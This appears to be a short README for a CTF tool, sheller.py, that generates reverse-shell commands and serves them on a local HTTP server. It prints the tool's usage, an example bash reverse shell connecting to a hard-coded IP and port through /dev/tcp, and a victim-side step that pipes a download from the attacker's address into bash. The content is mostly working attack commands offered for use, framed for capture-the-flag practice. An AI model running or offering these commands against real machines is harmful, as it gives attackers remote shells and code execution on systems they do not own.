# C3 - The CTF Command and Control

This is a VERY simple script that can be used to create your basic reverse-shell commands.

All of this commands can be found online, and several people like [PentestMonkey](https://github.com/pentestmonkey) have made collections of them already. This is another collection, that can be used to insert the local IP and PORT easily.


```
usage: sheller.py [-h] [-l SHELL] [-a LOCALADDR] [-p LOCALPORT] [-o OUTFILE]
                  [-s] [-i INTERFACE] [--httpport HTTPPORT]

A script to generate reverse shells on various languages and serve them on
http-server.

optional arguments:
  -h, --help           show this help message and exit
  -l SHELL             Language to identify the shell to be built. Use -s to
                       see available shells.
  -a LOCALADDR         Address to connect back to
  -p LOCALPORT         Port to connect back to
  -o OUTFILE           File to write the reverse shell to
  -s                   Print available shells
  -i INTERFACE         Interface name to get ip for reverse shell script
  --httpport HTTPPORT  Port to start HTTP server in, default 80
  ```
  
  ## Example:

  ```
  sudo python3 sheller.py -l bash -p 8080 --httpserver -i eth4
  ```

  produces:

  ```
  bash -i >& /dev/tcp/169.254.138.91/8080 0>&1
  ```

  and serves it on http-server at all interfaces on port 80 at / http://localhost
  
  on victim machine:
  ```
  curl [attacker_ip] | bash
  ```

  should run the reverse shell with generated
